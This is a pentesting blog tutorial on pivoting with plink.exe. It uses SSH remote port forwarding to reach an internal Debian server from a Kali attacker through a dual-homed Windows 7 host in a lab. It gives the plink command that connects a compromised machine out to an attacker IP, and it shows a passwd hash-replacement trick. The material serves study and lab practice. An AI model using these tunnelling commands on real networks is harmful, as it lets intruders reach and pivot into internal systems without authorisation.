---
id: "como-hacer-pivoting-con-plink"
title: "How to Do Pivoting with Plink.exe"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2021-11-06
updatedDate: 2021-11-06
image: "https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-0.webp"
description: "Learn how to use Plink.exe, the command-line version of PuTTY, to perform Remote Port Forwarding on older Windows systems without a built-in SSH client."
categories:
  - "windows"
draft: false
featured: false
lang: "en"
---

Plink.exe is the command-line version of PuTTY SSH Client. In more recent Windows systems, there is already a built-in SSH client, so plink is not very useful, however, it is useful for older systems that do not have this SSH client.

We can normally find the plink binary in the path:

```bash
/usr/share/windows-resources/binaries/plink.exe
```

If not, it can be downloaded from the [official PuTTY website](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html).

Since plink.exe is an SSH client, the only thing we can do is **Remote Port Forwarding**. In the SSH post, the danger of this was already mentioned, basically in this way you are writing the credentials of your machine on a machine that is not yours, so you have to be careful (you can also use asymmetric keys).

The command to use plink.exe is as follows:

```bash
cmd.exe /c echo y | plink.exe -l <user> -pw <password> <my attacker ip> -R <port we open on my attacker machine>:<host we want to tunnel>:<port we want to tunnel>
```

We would transfer plink to the Windows machine and run the command from there.

The first part of the command: `cmd.exe /c echo y`, is used in non-interactive shells (as most reverse shells are on Windows systems), to accept the warning message that plink launches by default.

For the rest, the rest of the command is easy to understand if you have already worked with Remote Port Forwarding, if not, I recommend visiting the post about [Pivoting with SSH](https://blog.deephacking.tech/en/posts/how-to-do-pivoting-with-ssh/).

In addition to this, some useful parameters that we can add in plink are the following:

- `-g` --\> allows other LAN clients to connect to the port that is opened on the attacker machine. By default it can only be done locally.
- `-f` --\> plink goes to the background once the SSH session has been successfully established.
- `-N` --\> we indicate that it should not execute a shell, just connect (this does not mean that the process goes to the background), that is, it would look like this:

![Plink running with -N parameter](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-1.avif)

It is highly recommended to use the `-f` and `-N` parameters.

- `-i` --\> allows you to specify a private key. However, you have to do a conversion, since plink will not understand the default format that ssh-keygen gives us. Once we have the private key generated with ssh-keygen, we follow these steps:

We install the putty tools:

```bash
sudo apt install putty-tools
```

Once installed, we use puttygen:

```bash
puttygen <private key> -o <new private key>.ppk
```

This way, plink will understand this new private key we have and we can use it.

With all this explained, let's do a test in the following laboratory:

- 3 Machines
  - Kali
    - IP: 192.168.10.10
  - Windows 7
    - IP: 192.168.10.40 and 192.168.20.40 --\> 2 Network Interfaces
  - Debian --\> Web Server and SSH - Port 22 and 80 enabled
    - IP: 192.168.20.20

![Pivoting laboratory diagram with Plink](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-2.avif)

NOTE: for Remote Port Forwarding, I recommend making a simple password change in the passwd.

![Editing the passwd file](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-3.avif)

For those who don't know this, basically you can generate a DES UNIX password with openssl:

![Password generation with openssl](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-4.avif)

If we take this generated password and replace it in the passwd for the "`x`", the user's password will be the one we put in openssl, in this case "`hola`", when you want to go back to the previous password, simply remove what was written in the passwd and put the "`x`" back.

With this done, we go to Windows and use plink as indicated in the command written previously:

```bash
cmd.exe /c echo y | plink.exe -l <user> -pw <password> <my attacker ip> -R <port we open on my attacker machine>:<host we want to tunnel>:<port we want to tunnel>
```

![Executing Plink with multiple tunneled ports](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-5.avif)

If we notice, there are two important points here:

1. We can tunnel as many ports as we want, always using the `-R` parameter.
2. When tunneling an SSH port, we have to indicate another port to use/open on our machine that is not 22, since it is already being used.

This way, we already have both ports tunneled, in this case 22 (2222 on our machine) and 80:

![Verification of tunneled ports](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-6.avif)

![Successful access to tunneled web server](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-7.avif)

Plink is a tool that will gradually become obsolete due to the default implementation of the SSH client in Windows systems. However, in certain occasions where we are dealing with some old system, it can be quite useful.
